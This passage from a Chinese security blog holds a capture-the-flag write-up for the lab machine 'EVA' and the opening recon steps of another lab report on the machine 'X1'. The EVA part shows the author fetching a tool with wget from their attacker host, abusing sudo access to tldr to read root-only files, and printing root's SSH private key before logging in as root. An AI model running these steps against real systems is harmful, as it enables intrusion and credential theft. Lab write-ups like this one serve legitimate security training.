eva.pinglog\nping\npong\nping\nping\nping\npong\npong\nping\nping\npong\npong\nping\npong\nping\nping\npong\nping\npong\npong\nping\npong\npong\npong\nping\nping\npong\npong\nping\nping\npong\npong\npong\nping\npong\npong\nping\nping\nping\nping\npong\nping\npong\npong\nping\npong\npong\nping\nping\nping\nping\npong\npong\npong\nping\npong\nping\nping\npong\nping\nping\nping\nping\npong\nping\nping\npong\npong\nping\npong\npong\nping\nping\nping\npong\npong\nping\nping\nping\nping\npong\nping\npong\npong\nping\nping\nping\npong\npong\nping\npong\npong\nping\npong\nping\npong\npong\nping\npong\npong\npong\nping\nping\npong\npong\nping\npong\npong\nping\npong\nping\nping\nping\nping\npong\npong\nping\nping\npong\nping\npong\nping\npong\npong\nping\nping\npong\nping\npong\nping\npong\npong\npong\nping\nping\nping\nping\nping\npong\npong\npong\nping\npong\npong\npong\nping\npong\npong\nping\nping\nping\nping\npong\nping\npong\npong\nping\npong\npong\nping\nping\nping\npong\npong\nping\npong\npong\nping\nping\n```\n\n\u7eaf\u731c\u8c1c\uff0cping\u4e3a0\uff0cpong\u4e3a1\n\n```\nuesugierii@EVA:~$ sed 's/ping/0/g; s/pong/1/g' eva.pinglog |tr -d '\\n'\n010001100110100101101110011001110110000101101100001110100100001001101100011000010110001101101011011100110110100001100101011001010111000001110111011000010110110001101100\n```\n\n![image-20250608111738243](https://7r1umphk.github.io/image/20250608111738641.webp)\n\nFingal:Blacksheepwall\n\n\u767b\u5f55\n\n```\nEVA:~$ su Fingal\nPassword: \n$ bash\nFingal@EVA:/home/uesugierii$ id\nuid=1000(Fingal) gid=1000(Fingal) groups=1000(Fingal)\n```\n\n\u7ee7\u7eed\u627e\u4fe1\u606f\n\n```\nFingal@EVA:/home/uesugierii$ cd ~\nFingal@EVA:~$ ls -la\ntotal 32\ndrwx------ 2 Fingal Fingal 4096 Jun  6 10:48 .\ndrwxr-xr-x 5 root   root   4096 Jun  6 09:43 ..\nlrwxrwxrwx 1 root   root      9 Jun  6 09:12 .bash_history -> /dev/null\n-rw-r--r-- 1 Fingal Fingal  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 Fingal Fingal 3526 Apr 18  2019 .bashrc\n-rw-r--r-- 1 Fingal Fingal  156 Jun  6 09:13 kernel.txt\n-rw-r--r-- 1 Fingal Fingal  807 Apr 18  2019 .profile\n-rw------- 1 Fingal Fingal   23 Jun  6 10:48 Ricardo.M.Lu\n-rw-r--r-- 1 root   root     48 Jun  6 09:12 user.txt\nFingal@EVA:~$ cat kernel.txt \n1. Lu Mingfei's safety is the top priority\n2. Immediate rescue operation when Lu Mingfei's life is endangered\n3. All rules are unmodifiable and irrevocable\nFingal@EVA:~$ cat Ricardo.M.Lu \nlumingfei:DivineDecree\nFingal@EVA:~$ cat user.txt \nflag{user-da00c95d-42d7-11f0-a8f0-000c2955ba04}\n```\n\nkernel.txt \u6587\u4ef6\u662f\u5173\u952e\uff0c\u8fd9\u91cc\u9700\u8981\u4e00\u70b9\u9f99\u65cf\u7684\u77e5\u8bc6\n\n\u8bfa\u739b\u662f\u4e00\u4e2a\u8d85\u7ea7\u8ba1\u7b97\u673a\uff0c\u4ed6\u7684\u6838\u5fc3\u4ee3\u7801\u5199\u5165\u4e86\u4fdd\u62a4\u8def\u660e\u975e\uff0ckernel.txt\u662f\u4ed6\u7684\u89c4\u5219\n\n1. \u8def\u660e\u975e\u7684\u5b89\u5168\u81f3\u4e0a\n2. \u8def\u660e\u975e\u751f\u547d\u53d7\u5230\u5a01\u80c1\u65f6\uff0c\u7acb\u5373\u5c55\u5f00\u6551\u63f4\u884c\u52a8\n3. \u6240\u6709\u89c4\u5219\u5747\u4e0d\u53ef\u66f4\u6539\u4e14\u4e0d\u53ef\u64a4\u9500\n\n\u6252\u62c9\u4e00\u4e2apspy\u8fc7\u6765\uff0c\u770b\u770b\u662f\u4e0d\u662f\u6709\u8ff9\u53ef\u5faa\n\n```\nFingal@EVA:~$ busybox wget 192.168.205.206/pspy64\nConnecting to 192.168.205.206 (192.168.205.206:80)\npspy64               100% |***********************************************************************************************************************************| 3032k  0:00:00 ETA\nFingal@EVA:~$ chmod +x pspy64 \nFingal@EVA:~$ ./pspy64 \n2025/06/07 23:21:52 CMD: UID=0     PID=3558   | /bin/bash /usr/local/bin/dragon_rule \n2025/06/07 23:21:52 CMD: UID=0     PID=3559   | sudo usermod -s /usr/sbin/nologin lumingfei \n```\n\n\u5173\u952e\u7684\u4e24\u53e5\uff0c\u4ed6\u5148\u6267\u884c\u4e86/usr/local/bin/dragon_rule \uff0c\u7136\u540e\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u4fee\u6539\u7528\u6237\uff0c\u5c06\u767b\u5f55 Shell \u4e3a `/usr/sbin/nologin`\uff0c\u5373\u7981\u6b62\u8be5\u7528\u6237\u767b\u5f55\u7cfb\u7edf\u3002\n\n\u7784\u773c\u770b\u80fd\u4e0d\u80fd\u770bdragon_rule \n\n```\nFingal@EVA:~$ ls -la /usr/local/bin/dragon_rule\n-rwx------ 1 root root 784 Jun  6 09:15 /usr/local/bin/dragon_rule\n```\n\n\u4e0d\u80fd\u62ff\u7b49\u62ff\u4e86root\u518d\u770b\u5427\n\n```\nFingal@EVA:~$ su lumingfei\nPassword: \nThis account is currently not available.\n```\n\n\u786e\u5b9e\u767b\u5f55\u4e0d\u4e86\uff0c\u5176\u5b9e\u5904\u7406\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u6211\u731c\u6d4bdragon_rule\u662f\u4e00\u4e2a\u76d1\u542c\u6587\u672c\u7684\u811a\u672c\uff0c\u76d1\u542c\u7684\u5c31\u662fkernel.txt\uff0c\u6240\u4ee5\uff0c\u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u6ca1\u6709\u4e86\uff0c\u4ed6\u5c31\u6302\u6389\u4e86\n\n```\nFingal@EVA:~$ mv kernel.txt kernel.txt.bak\nFingal@EVA:~$ su lumingfei\nPassword: \nlumingfei@EVA:/home/Fingal$ id\nuid=1001(lumingfei) gid=1001(lumingfei) groups=1001(lumingfei)\n```\n\n\u7ee7\u7eed\u627e\u4fe1\u606f\n\n```\nlumingfei@EVA:/home/Fingal$ cd \nlumingfei@EVA:~$ ls -al\ntotal 20\ndrwx------ 2 lumingfei lumingfei 4096 Jun  6 09:12 .\ndrwxr-xr-x 5 root      root      4096 Jun  6 09:43 ..\n-rw-r--r-- 1 lumingfei lumingfei  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 lumingfei lumingfei 3526 Apr 18  2019 .bashrc\n-rw-r--r-- 1 lumingfei lumingfei  807 Apr 18  2019 .profile\nlumingfei@EVA:~$ sudo -l\nMatching Defaults entries for lumingfei on EVA:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser lumingfei may run the following commands on EVA:\n    (ALL) NOPASSWD: /usr/local/bin/tldr\n```\n\n\u80fd\u6267\u884ctldr\uff0c\u5982\u679c\u4f60\u7ecf\u5e38\u770b\u7fa4\u4e3b\u7684\u89c6\u9891\uff0c\u4f60\u5c31\u4f1a\u975e\u5e38\u719f\u6089tldr\uff0c\u4ed6\u559c\u6b22\u62fftldr\u770bsocat\u7684\u8bed\u53e5\uff0c\u793a\u8303\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tldr \nCommand 'tldr' not found, but can be installed with:\nsudo apt install tealdeer\nDo you want to install it? (N/y)y\nsudo apt install tealdeer\n[sudo] password for kali: \nThe following packages were automatically installed and are no longer required:\n  docker-buildx-plugin  docker-ce-rootless-extras  docker-compose-plugin  libslirp0  slirp4netns\nUse 'sudo apt autoremove' to remove them.\n\nInstalling:\n  tealdeer\n\nSummary:\n  Upgrading: 0, Installing: 1, Removing: 0, Not Upgrading: 0\n  Download size: 967 kB\n  Space needed: 2,761 kB / 91.0 GB available\n\nGet:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 tealdeer amd64 1.7.2-1+b1 [967 kB]\nFetched 967 kB in 1s (1,107 kB/s)\nSelecting previously unselected package tealdeer.\n(Reading database ... 474779 files and directories currently installed.)\nPreparing to unpack .../tealdeer_1.7.2-1+b1_amd64.deb ...\nUnpacking tealdeer (1.7.2-1+b1) ...\nSetting up tealdeer (1.7.2-1+b1) ...\nProcessing triggers for kali-menu (2025.2.7) ...\nProcessing triggers for man-db (2.13.1-1) ...\n                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tldr socat               \nError: Page cache not found. Please run `tldr --update` to download the cache.\n\nNote: You can optionally enable automatic cache updates by adding the\nfollowing config to your config file:\n\n  [updates]\n  auto_update = true\n\nThe path to your config file can be looked up with `tldr --show-paths`.\nTo create an initial config file, use `tldr --seed-config`.\n\nYou can find more tips and tricks in our docs:\n\n  https://tealdeer-rs.github.io/tealdeer/config_updates.html\n                                                                                                                                                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tldr --update\nSuccessfully created cache directory path `/home/kali/.cache/tealdeer`.\nSuccessfully updated cache.\n                                                               \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ tldr socat   \n\n  Multipurpose relay (SOcket CAT).\n  More information: <http://www.dest-unreach.org/socat/>.\n\n  Listen to a port, wait for an incoming connection and transfer data to STDIO:\n\n      sudo socat - TCP-LISTEN:8080,fork\n\n  Listen on a port using SSL and print to STDOUT:\n\n      sudo socat OPENSSL-LISTEN:4433,reuseaddr,cert=./cert.pem,cafile=./ca.cert.pem,key=./key.pem,verify=0 STDOUT\n\n  Create a connection to a host and port, transfer data in STDIO to connected host:\n\n      sudo socat - TCP4:www.example.com:80\n\n  Forward incoming data of a local port to another host and port:\n\n      sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80\n\n  Send data with multicast routing scheme:\n\n      echo 'Hello Multicast' | socat - UDP4-DATAGRAM:224.0.0.1:5000\n\n  Receive data from a multicast:\n\n      socat - UDP4-RECVFROM:5000\n\n\n```\n\n\u633a\u597d\u7528\u7684\uff0c\u53ef\u4ee5\u4e0b\u8f7d\u8bd5\u8bd5\uff0c\u56de\u987e\u6b63\u9898\n\n\u770b\u770b\u5e2e\u52a9\u6587\u6863\n\n```\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr --help\nusage: tldr command [options]\n\nPython command line client for tldr\n\npositional arguments:\n  command               command to lookup\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -v, --version         show program's version number and exit\n  --search 'KEYWORDS'   Search for a specific command from a query\n  -u, --update, --update_cache\n                        Update the local cache of pages and exit\n  -k, --clear-cache     Delete the local cache of pages and exit\n  -p PLATFORM, --platform PLATFORM\n                        Override the operating system [android, freebsd, linux, netbsd, openbsd, osx, sunos, windows, common]\n  -l, --list            List all available commands for operating system\n  -s SOURCE, --source SOURCE\n                        Override the default page source\n  -c, --color           Override color stripping\n  -r, --render          Render local markdown files\n  -L LANGUAGE, --language LANGUAGE\n                        Override the default language\n  -m, --markdown        Just print the plain page file.\n  --short-options       Display shortform options over longform\n  --long-options        Display longform options over shortform\n  --print-completion {bash,zsh,tcsh}\n                        print shell completion script\n```\n\n![image-20250608113303243](https://7r1umphk.github.io/image/20250608113303691.webp)\n\n\u63d0\u6743\u7684\u5173\u952e\n\n-r, --render \u6e32\u67d3\u672c\u5730markdown \u6587\u4ef6\n\n-m, --markdown \u4ec5\u6253\u5370\u7eaf\u6587\u672c\u9875\u9762\u6587\u4ef6\u3002\n\n\u90a3\u76f4\u63a5\u770broot.txt\u5c31ok\u4e86\n\n```\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/root.txt\nflag{root-da00c95d-42d7-11f0-a8f0-000c2955ba04}\n```\n\n\u770b\u6709\u6ca1\u6709ssh\u79c1\u94a5\n\n```\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_rsa   \n```\n\n\u6ca1\u6709\uff0c\u627essh\u914d\u7f6e\u6587\u4ef6\u770b\u770b\uff0c\u6709\u5565\u79c1\u94a5\n\n```\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /etc/ssh/ssh_config\n\n# This is the ssh client system-wide configuration file.  See\n# ssh_config(5) for more information.  This file provides defaults for\n# users, and the values can be changed in per-user configuration files\n# or on the command line.\n\n# Configuration data is parsed as follows:\n#  1. command line options\n#  2. user-specific file\n#  3. system-wide file\n# Any configuration value is only changed the first time it is set.\n# Thus, host-specific definitions should be at the beginning of the\n# configuration file, and defaults at the end.\n\n# Site-wide defaults for some commonly used options.  For a comprehensive\n# list of available options, their meanings and defaults, please see the\n# ssh_config(5) man page.\n\nInclude /etc/ssh/ssh_config.d/*.conf\n\nHost *\n#   ForwardAgent no\n#   ForwardX11 no\n#   ForwardX11Trusted yes\n#   PasswordAuthentication yes\n#   HostbasedAuthentication no\n#   GSSAPIAuthentication no\n#   GSSAPIDelegateCredentials no\n#   GSSAPIKeyExchange no\n#   GSSAPITrustDNS no\n#   BatchMode no\n#   CheckHostIP yes\n#   AddressFamily any\n#   ConnectTimeout 0\n#   StrictHostKeyChecking ask\n#   IdentityFile ~/.ssh/id_rsa\n#   IdentityFile ~/.ssh/id_dsa\n#   IdentityFile ~/.ssh/id_ecdsa\n#   IdentityFile ~/.ssh/id_ed25519\n#   Port 22\n#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc\n#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com\n#   EscapeChar ~\n#   Tunnel no\n#   TunnelDevice any:any\n#   PermitLocalCommand no\n#   VisualHostKey no\n#   ProxyCommand ssh -q -W %h:%p gateway.example.com\n#   RekeyLimit 1G 1h\n#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k\n    SendEnv LANG LC_*\n    HashKnownHosts yes\n    GSSAPIAuthentication yes\n\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_dsa\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ecdsa\nlumingfei@EVA:~$ sudo /usr/local/bin/tldr -r -m /root/.ssh/id_ed25519\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF\n1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA\nAAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ\nRIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----\n\n```\n\n\u6252\u62c9\u8fc7\u6765\u672c\u5730\n\n```\nlumingfei@EVA:~$ vim id\nlumingfei@EVA:~$ cat id \n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjAAAAJDykgXW8pIF\n1gAAAAtzc2gtZWQyNTUxOQAAACCibTdCkv+i3LGrclIKxsVY2USCsDX2v8xfmgbqWDWyjA\nAAAEAiGjoPuqQuw24AFcnFZd0C3RXVTGtmVSLBIS3k/bLdKaJtN0KS/6LcsatyUgrGxVjZ\nRIKwNfa/zF+aBupYNbKMAAAACHJvb3RARVZBAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----\n\nlumingfei@EVA:~$ chmod 600 id \nlumingfei@EVA:~$ ssh root@127.0.0.1 -i id \nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:IV6iZTL6D//1Ojh0d8XoSMepPgjyUfV/FpQmf3q35Hg.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.\nLinux EVA 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jun  6 10:46:54 2025 from 192.168.3.94\nroot@EVA:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6252\u62c9\u4e00\u4e0b\u811a\u672c\uff0c\u770b\u770b\u600e\u4e48\u5b9e\u73b0\u7684\n\n```\nroot@EVA:~# cat /usr/local/bin/dragon_rule\n#!/bin/bash\n\nRULES=(\n    'Lu Mingfei's safety is the top priority'\n    'Immediate rescue operation when Lu Mingfei's life is endangered'\n    'All rules are unmodifiable and irrevocable'\n)\nverify_rules() {\n    for rule in '${RULES[@]}'; do\n        if ! grep -qF '$rule' /home/Fingal/kernel.txt; then\n            return 1\n        fi\n    done\n    return 0\n}\nprotect_lumingfei() {\n    if verify_rules; then\n        sudo usermod -s /usr/sbin/nologin lumingfei 2>/dev/null\n    else\n        sudo usermod -s /bin/bash lumingfei 2>/dev/null\n        sudo systemctl stop dragon-monitor 2>/dev/null\n        sudo systemctl disable dragon-monitor 2>/dev/null\n    fi\n}\nprotect_lumingfei\ninotifywait -m -e modify,delete /home/Fingal/kernel.txt 2>/dev/null | while read; do\n    protect_lumingfei\ndone\n```\n\nai\u751f\u6210\u7684\u903b\u8f91\u6d41\u7a0b\u56fe\n\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 \u76d1\u542c kernel.txt \u4fee\u6539/\u5220\u9664\u4e8b\u4ef6 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n             \u2502\n             \u25bc\n     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n     \u2502   \u9a8c\u8bc1 kernel.txt \u5185\u5bb9  \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                  \u2502\n      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n      \u25bc                        \u25bc\n[ \u89c4\u5219\u5b8c\u6574 ]           [ \u89c4\u5219\u4e0d\u5b8c\u6574 ]\n  \u2193                            \u2193\n\u7981\u6b62 lumingfei \u767b\u5f55       \u5141\u8bb8 lumingfei \u767b\u5f55\n\u4fdd\u6301 dragon-monitor \u8fd0\u884c    \u505c\u6b62\u5e76\u7981\u7528 dragon-monitor\n```\n\n\u90a3\u6709\u4e2a\u60f3\u6cd5\uff0cwsl2\u4f7f\u7528kali\u7684\u4e0d\u662f\u5929\u5929\u8981\u4fee\u6539\u4e24\u4e2ahosts\u5417\uff1f\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\uff0c\u5982\u679clinux hosts\u6709\u4fee\u6539\u5c31\u590d\u5236\u53bbwindows hosts\uff0c\u5b8c\u7f8e\u89e3\u51b3\uff0c\u54c8\u54c8\u54c8\uff0c\u4f60\u4eec\u81ea\u5df1\u53bb\u5c1d\u8bd5\u5427sentence", "top": 0, "createdAt": 1751016575, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P36": {"htmlDir": "docs/post/ba-ji- X1 -shen-tou-ce-shi-bao-gao.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u9776\u673a X1 \u6e17\u900f\u6d4b\u8bd5\u62a5\u544a", "postUrl": "post/ba-ji-%20X1%20-shen-tou-ce-shi-bao-gao.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/36", "commentNum": 0, "wordCount": 14506, "description": "Hello\uff01\u4eca\u5929\u5206\u4eab\u4e00\u4e0b\u9776\u673a X1 \u7684\u6e17\u900f\u8fc7\u7a0b\u3002\u8fd9\u9776\u673a\u5176\u5b9e\u53d1\u5e03\u6709\u51e0\u5929\u4e86\uff0c\u4f46\u6211\u4e00\u76f4\u6ca1\u5565\u7a7a\u3002\u4eca\u5929\u7785\u4e86\u4e00\u773c\u7fa4\u91cc\uff0c\u5c31\u4e00\u4e2a\u4eba\u89e3\u51fa\u6765\u4e86\uff0c\u7ed9\u6211\u6574\u597d\u5947\u4e86\uff01\n\n![image-20250511212617292](https://7r1umphk.github.io//image/20250511212617409.webp)\n\n### \u4e00\u3001\u4fe1\u606f\u6536\u96c6\uff0c\u6253\u63a2\u654c\u60c5\n\n#### 1. \u8001\u89c4\u77e9\uff0c`arp-scan` \u5f00\u8def\u627e\u90bb\u5c45\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo arp-scan -l         \n[sudo] password for kali: \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       (Unknown)\n192.168.205.2   00:50:56:f4:ef:6f       (Unknown)\n192.168.205.207 08:00:27:aa:93:a3       (Unknown)  <-- \u76ee\u6807IP\n192.168.205.254 00:50:56:ef:52:74       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded\n```\n\n\u76ee\u6807IP\u9501\u5b9a\uff1a`192.168.205.207`\u3002\n\n#### 2. `nmap` \u626b\u7aef\u53e3\uff0c\u770b\u770b\u5f00\u4e86\u5565\u670d\u52a1\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p- 192.168.205.207         \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-11 09:26 EDT\nNmap scan report for 192.168.205.207\nHost is up (0.00014s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:AA:93:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.16 seconds\n```\n\n\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\u90a3\u5fc5\u987b\u5148\u4ece 80 \u7aef\u53e3\u4e0b\u624b\uff01\n\n#### 3. \u8bbf\u95ee80\u7aef\u53e3\uff0c\u521d\u63a2Web\u5e94\u7528\n\n\u6d4f\u89c8\u5668\u6253\u5f00 `http://192.168.205.207/`\uff1a\n\n![image-20250511212745043](https://7r1umphk.github.io/image/20250511212745266.webp)\n\n\u770b\u7740\u50cf\u662f\u4e2aCMS\uff0c\u9875\u9762\u4e0a\u8fd8\u6709\u4e2a 'shark'\uff08\u9ca8\u9c7c\uff09\u3002\u76f4\u89c9\u544a\u8bc9\u6211\uff0c`nuclei` \u8be5\u542f\u52a8\u4e86\uff01\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nuclei -u http://192.168.205.207/\n\n# ... (\u90e8\u5206\u8f93\u51fa\u7701\u7565) ...\n\n[joomla-manifest-file] [http] [medium] http://192.168.205.207/administrator/manifests/files/joomla.xml\n[apache-detect] [http] [info] http://192.168.205.207/ ['Apache/2.4.62 (Debian)']\n[corebos-htaccess] [http] [info] http://192.168.205.207/htaccess.txt\n[joomla-detect:version] [http] [info] http://192.168.205.207/administrator/manifests/files/joomla.xml ['5.3.0']\n\n# ... (\u5176\u4ed6\u68c0\u6d4b\u7ed3\u679c) ...\n```\n\n\u662f Joomla\uff0c\u7248\u672c 5.3.0\u3002\u67e5\u4e86\u4e00\u4e0b\uff0c\u8fd9\u7248\u672c3\u6708\u4efd\u624d\u53d1\u5e03\u7684\u7b2c\u4e09\u7248\uff0c\u771f\u591f\u65b0\u9c9c\u7684\uff08\u6d41\u9f3b\u6d95\uff09\u3002\u8fd9\u610f\u5473\u7740\u516c\u5f00\u7684 Exploit \u4f30\u8ba1\u662f\u6ca1\u620f\u4e86\uff0c\u9664\u975e\u54b1\u80fd\u73b0\u573a\u6253\u4e2a0day\uff0c\u90a3\u5f53\u6211\u6ca1\u8bf4\u3002\n\n\u8fd8\u662f\u8001\u8001\u5b9e\u5b9e\u627e\u4fe1\u606f\u5427\u3002\n\n#### 4. \u76ee\u5f55\u7206\u7834\uff0c\u770b\u770b\u85cf\u4e86\u5565\n\n\u7528 `gobuster` \u8dd1\u4e00\u4e0b\u76ee\u5f55\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx]\n\u2514\u2500$ gobuster dir -u http://192.168.205.207/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html\n# ... (\u626b\u63cf\u8fc7\u7a0b\u548c\u90e8\u5206\u7ed3\u679c) ...\n/images               (Status: 301) [Size: 319] [--> http://192.168.205.207/images/]\n/index.php            (Status: 200) [Size: 9102]\n/README.txt           (Status: 200) [Size: 5034]\n/robots.txt           (Status: 200) [Size: 764]\n/administrator        (Status: 301) [Size: 326] [--> http://192.168.205.207/administrator/]\n/configuration.php    (Status: 200) [Size: 0] \n/htaccess.txt         (Status: 200) [Size: 6899]\n# ... (\u5176\u4ed6301\u91cd\u5b9a\u5411) ...\n```\n\n\u626b\u51fa\u6765\u4e00\u5806301\uff0c\u6709\u7528\u7684\u4e0d\u591a\u3002\n\n* `/index.php`\uff1a\u9996\u9875\uff0c\u5ffd\u7565\u3002\n\n* `/README.txt`\uff1a\u6ca1\u5565\u9690\u85cf\u4fe1\u606f\u3002\n\n* `/robots.txt`\uff1a\u5185\u5bb9\u5982\u4e0b\uff1a\n\n  ```\n  User-agent: *\n  Disallow: /administrator/\n  Disallow: /api/\n  Disallow: /bin/\n  Disallow: /cache/\n  Disallow: /cli/\n  Disallow: /components/\n  Disallow: /includes/\n  Disallow: /installation/\n  Disallow: /language/\n  Disallow: /layouts/\n  Disallow: /libraries/\n  Disallow: /logs/\n  Disallow: /modules/\n  Disallow: /plugins/ \n  Disallow: /tmp/\n  ```\n\n  `/plugins/` \u76ee\u5f55\u770b\u7740\u53ef\u7591\uff0c\u4f46\u8bbf\u95ee\u4e86\u4e00\u4e0b\uff0c\u4e0d\u7ed9\u770b...\n\n* `/htaccess.txt`\uff1a\u4e5f\u6ca1\u5565\u9690\u85cf\u4fe1\u606f\u3002\n\n#### 5. Joomla\u4e13\u7528\u626b\u63cf\u5668 `joomscan` \u767b\u573a\n\n\u627e\u4e86\u534a\u5929\u6ca1\u5565\u8fdb\u5c55\uff0c\u638f\u51fa\u4e86 Joomla \u4e13\u7528\u626b\u63cf\u5668 `joomscan`\uff1a\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ joomscan --url http://192.168.205.207/\n# ... (\u626b\u63cf\u8fc7\u7a0b) ...\n[+] FireWall Detector\n[++] Firewall not detected\n\n[+] Detecting Joomla Version\n[++] Joomla 5.3.0\n\n[+] Core Joomla Vulnerability\n[++] Target Joomla core is not vulnerable\n\n[+] Checking Directory Listing\n[++] directory has directory listing : \nhttp://192.168.205.207/administrator/components\nhttp://192.168.205.207/administrator/modules\nhttp://192.168.205.207/administrator/templates\nhttp://192.168.205.207/images/banners\n# ... (\u5176\u4ed6\u53d1\u73b0) ...\n```\n\n`joomscan` \u4e5f\u6ca1\u53d1\u73b0\u5565\u5b9e\u8d28\u6027\u7684\u6f0f\u6d1e\uff0c\u5c31\u5217\u4e86\u51e0\u4e2a\u80fd\u8bbf\u95ee\u7684\u76ee\u5f55\u3002\u6211\u8fd8\u4ee5\u4e3a\u80fd\u6252\u62c9\u51fa\u4e2a\u4ec0\u4e48\u63d2\u4ef6\u6f0f\u6d1e\u5462\uff0c\u7ed3\u679c\u8fd9CMS\u6bd4\u6211\u94b1\u5305\u90fd\u5e72\u51c0\u3002\n\n#### 6. \u96be\u9053\u4e0d\u662f80\u7aef\u53e3\uff1f\u6392\u67e5\u5176\u4ed6\u53ef\u80fd\u6027\n\n**IPv6 \u7785\u7785\uff1a**\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ ping6 -I 